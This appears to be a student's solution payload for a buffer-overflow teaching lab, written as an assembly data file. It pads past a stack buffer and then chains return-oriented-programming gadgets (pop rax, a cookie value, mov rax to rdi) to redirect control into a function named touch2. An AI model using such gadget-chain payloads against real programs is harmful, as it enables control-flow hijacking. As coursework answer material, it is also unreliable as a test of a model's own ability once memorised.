.globl rsp

rsp:
    .org rsp + 0x18, 0x23

rbp:
    .quad 0x401a40      /* popq %rax */
    .quad 0x2a402507    /* cookie */
    .quad 0x401a46      /* movq %rax, %rdi */
    .quad 0x40188f      /* touch2 */

tail:
    .byte 0xa
